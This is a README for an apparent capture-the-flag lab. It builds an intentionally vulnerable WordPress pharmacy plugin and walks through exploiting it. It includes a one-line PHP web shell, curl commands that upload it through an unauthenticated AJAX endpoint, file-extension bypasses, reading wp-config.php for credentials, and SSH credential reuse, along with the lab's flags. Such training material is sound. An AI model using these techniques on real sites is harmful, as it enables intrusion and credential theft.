# Stage 4: Secret Pharmacy WordPress - CTF Challenge

## Overview
This is a **CTF-safe vulnerable WordPress installation** simulating a real-world WordPress RCE scenario for educational purposes only.

**Stage 4 Goal:** Exploit the vulnerable pharmacy plugin to achieve RCE as `www-data` user.

---

## Quick Start

### Prerequisites
- Docker & Docker Compose installed
- Linux/Mac terminal

### Launch the challenge

```bash
cd stage4-wordpress
docker-compose up -d
```

Check status:
```bash
docker-compose ps
```

Access WordPress:
- **URL:** `http://localhost`
- **Admin Panel:** `http://localhost/wp-admin`
- **Credentials:** `admin` / `admin`

---

## Challenge Flow (Stage 3 → Stage 4 → Stage 5)

### Players incoming from Stage 3
- Have SSH access to host 3 (internal web server)
- Discovered internal vhost hint: `secret-pharmacy.local`
- Pivoted to host 4 (WordPress server)

### Stage 4 Objectives
1. **Enumeration**
   - Find WordPress version
   - List installed plugins
   - Identify "Pharmacy Inventory System" plugin

2. **Vulnerability Exploitation**
   - AJAX endpoint: `/wp-admin/admin-ajax.php?action=pharmacy_export_data`
   - Vulnerability: Missing nonce validation + weak file upload checks
   - Exploit technique: Upload PHP file with modified extension or MIME type
   - Achieve: Command execution as `www-data`

3. **Data Exfiltration**
   - Read `/var/www/html/wp-config.php` → database credentials
   - Read `/var/www/html/wp-content/pharmacy_config.php` → Stage 5 creds/hints
   - Extract database backup with SSH reuse credentials

4. **Flag Collection**
   - Intermediate Flag: `CTF{wordpress_rce_exploitation}`
   - Stage 5 Access: Credentials for privilege escalation

---

## Plugin Vulnerabilities

### Vulnerability #1: Unauthenticated AJAX + Missing Nonce

**Endpoint:** `wp-admin/admin-ajax.php?action=pharmacy_export_data`

**Issue:** 
- No `check_admin_referer()` call
- `add_action('wp_ajax_nopriv_...')` allows unauthenticated access
- Input not sanitized

**Exploit:**
```bash
curl -X POST http://localhost/wp-admin/admin-ajax.php \
  -F "action=pharmacy_export_data" \
  -F "export_file=@shell.php.txt"
```

### Vulnerability #2: Weak File Extension Validation

**Issue:**
- Only checks file extension (case-sensitive in some systems)
- Can bypass with: `.phtml`, `.php5`, `.phar`, `.shtml`
- Uploaded to web-accessible directory `/wp-content/uploads/exports/`

**Exploit:**
```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.phtml

# Upload via vulnerable endpoint
curl -X POST http://localhost/wp-admin/admin-ajax.php \
  -F "action=pharmacy_export_data" \
  -F "export_file=@shell.phtml"

# Execute commands
curl "http://localhost/wp-content/uploads/exports/shell.phtml?cmd=id"
```

### Vulnerability #3: Insecure File Handling

**Issue:**
- No MIME type validation
- No file content scanning
- Uploaded files retain execute permissions

---

## Files & Structure

```
stage4-wordpress/
├── docker-compose.yml          # Docker setup
├── init-db.sql                 # Database initialization
├── init-wp.sh                  # WordPress initialization
├── wordpress/                  # WordPress root
│   └── wp-content/plugins/
│       └── ctf-vulnerable-plugin/
│           └── pharmacy-plugin.php    # Vulnerable plugin code
└── mysql-data/                 # Database volume
```

---

## Hidden Flags & Credentials

### In wp-config.php
```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_user');
define('DB_PASSWORD', 'wp_password_123');
```

### In plugin config (after RCE)
```php
// /var/www/html/wp-content/pharmacy_config.php
$db_backup_host = 'db.internal.pharmacy.local';
$db_backup_user = 'pharmacy_admin';
$db_backup_pass = 'PharmacyPass_2025';
$flag_stage4 = 'CTF{wordpress_rce_exploitation}';
```

### Stage 5 Progression
- Use `PharmacyPass_2025` for SSH reuse on host 5
- Trigger privilege escalation challenge

---

## Player Walkthrough (Hints)

### Phase 1: Enumeration
```bash
# From stage 3 shell, pivot to stage 4
ssh -i key pharmacy_user@secret-pharmacy.local

# Enumerate WordPress
curl http://localhost/wp-admin/admin-ajax.php?action=pharmacy_get_inventory
wpscan --url http://localhost --enumerate p
```

### Phase 2: Exploitation
```bash
# Create payload
echo '<?php system("id > /tmp/pwned.txt"); ?>' > payload.php.txt

# Upload via AJAX
curl -X POST http://localhost/wp-admin/admin-ajax.php \
  -F "action=pharmacy_export_data" \
  -F "export_file=@payload.php.txt"

# Access shell
curl http://localhost/wp-content/uploads/exports/payload.php.txt
```

### Phase 3: Privilege Escalation (Stage 5)
```bash
# Read config
cat /var/www/html/wp-content/pharmacy_config.php

# Use credentials on next host
ssh pharmacy_admin@stage5-host
# Password: PharmacyPass_2025

# Exploit priv-esc to get final flag
```

---

## Docker Debugging

### View logs
```bash
docker-compose logs -f wordpress
docker-compose logs -f mysql
```

### Execute commands inside container
```bash
docker-compose exec wordpress bash
docker-compose exec wordpress wp plugin list --allow-root
```

### Reset/Cleanup
```bash
docker-compose down
rm -rf mysql-data wordpress/wp-*  # Keep plugin
docker-compose up -d
```

---

## Customization

### Change WordPress URL
Edit `docker-compose.yml`:
```yaml
environment:
  WORDPRESS_URL: http://secret-pharmacy.local
```

### Modify Plugin Behavior
Edit `wordpress/wp-content/plugins/ctf-vulnerable-plugin/pharmacy-plugin.php`:
- Change flag values
- Adjust vulnerability difficulty
- Add more hints

### Change Database Credentials
Edit `docker-compose.yml`:
```yaml
environment:
  MYSQL_PASSWORD: your_new_password
  WORDPRESS_DB_PASSWORD: your_new_password
```

---

## Security Notes (for CTF context)

⚠️ **This setup is intentionally vulnerable for CTF training only.**
- Never use in production
- All credentials are intentionally weak
- Vulnerabilities are educational demonstrations

---

## Progression to Stage 5

After completing Stage 4 objectives:
1. Extract `pharmacy_config.php` with RCE
2. Obtain credentials: `pharmacy_admin` / `PharmacyPass_2025`
3. SSH into Stage 5 host
4. Proceed to privilege escalation challenge
5. Read `/root/final_flag.txt` as root user

